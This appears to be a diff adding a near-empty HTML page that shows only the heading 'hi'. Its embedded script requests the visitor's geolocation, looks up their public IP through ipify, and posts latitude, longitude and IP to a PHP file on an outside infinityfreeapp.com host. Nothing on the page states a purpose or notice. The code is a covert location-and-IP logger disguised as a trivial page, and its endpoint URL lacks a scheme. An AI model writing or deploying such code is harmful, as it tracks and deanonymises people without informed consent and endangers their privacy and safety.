@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+</head>
+<body>
+<h1>hi</h1>
+<script type="text/javascript">
+// Get the user's location and IP address
+navigator.geolocation.getCurrentPosition(function(position) {
+  let latitude = position.coords.latitude;
+  let longitude = position.coords.longitude;
+
+  // Send an XHR request to get the user's IP address
+  let xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://api.ipify.org?format=json');
+  xhr.onload = function() {
+    if (xhr.status === 200) {
+      let ip = JSON.parse(xhr.responseText).ip;
+
+      // Send the location and IP address to a PHP file
+      let xhr2 = new XMLHttpRequest();
+      xhr2.open('POST', 'dhandev.infinityfreeapp.com/location.php');
+      xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr2.onload = function() {
+        if (xhr2.status === 200) {
+        }
+      };
+      xhr2.send('latitude=' + latitude + '&longitude=' + longitude + '&ip=' + ip);
+    }
+  };
+  xhr.send();
+});
+
+</script>
+</body>
+</html>
